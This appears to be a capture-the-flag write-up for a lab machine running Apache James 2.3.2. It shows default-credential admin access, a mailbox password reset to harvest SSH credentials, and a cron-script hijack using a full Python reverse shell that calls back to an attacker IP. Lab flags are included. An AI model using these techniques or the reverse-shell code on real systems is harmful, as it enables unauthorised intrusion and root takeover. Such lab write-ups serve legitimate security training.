
Target : 10.129.26.31

Started off with the port scan : 22, 25, 80, 110, 119, 4555

Enumerating Port : 80

Directory Bruteforcing : got nothing interesting

Enumerating Port : 25

![](../Pasted%20image%2020260703125325.png)

`JAMES SMTP Server 2.3.2 - CVE-2015-7611 `

Apache James Server 2.3.2 contains multiple well-documented vulnerabilities, the most notable being **CVE-2015-7611**, which allows for Remote Code Execution (RCE) and OS Command Injection

default credentials is `root:root`

To connect with the  James Administration tool running in port 4555

`nc 10.129.26.31 4555`

Using this exploit : https://github.com/CyberQuestor-infosec/Apache-James-Server-2.3.2_Unauthenticated-Remote-Command-Execution-RCE/blob/main/exploit.py

![](../Pasted%20image%2020260703130546.png)

payload will trigger only after the ssh connection made. 

so, we need to find the ssh credentials, for that we can read the emails from pop3 

But, before reading mails, have to change the password using the JAMES Remote Administration tool : `setpassword [username] [password]`

`nc -nv 10.129.26.31 110` (or) `telnet 10.129.26.31 110`

```
USER mindy
PASS mindy

LIST

RETR 2
```

username: mindy
pass: P@55W0rd1!2@

ssh : `ssh mindy@10.129.26.41`

```
mindy@solidstate:~$ cat user.txt 
78944c5335f2a0927255df7800168ae4
```

Got shell as mindy. Now, we can able to execute CVE-2015-7611 and got access.

**Root Escalation:** 

Tried all the possible enumeration and got nothing exciting, then used pspy32 to monitor any scheduled process execution as root, and got noticed 03 min once, below command executed by root :

`2026/07/03 05:54:01 CMD: UID=0     PID=2438   | /bin/sh -c python /opt/tmp.py`
`2026/07/03 05:57:01 CMD: UID=0     PID=2501   | /bin/sh -c python /opt/tmp.py`

And also, we have write access to the file /opt/tmp.py

`-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py`

Modifying script:

```
import os
import socket
import pty

# Set variables directly in Python
rhost = "10.10.16.241"
rport = 1234

# Create connection and duplicate file descriptors
s = socket.socket()
s.connect((rhost, rport))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)

# Spawn the interactive shell
pty.spawn("/bin/sh")

```

`nc -lvnp 1234`

After 03 minutes, got the shell 

`root.txt : 8cbb1c6ab9c96cea54994f2ba20d9cae `
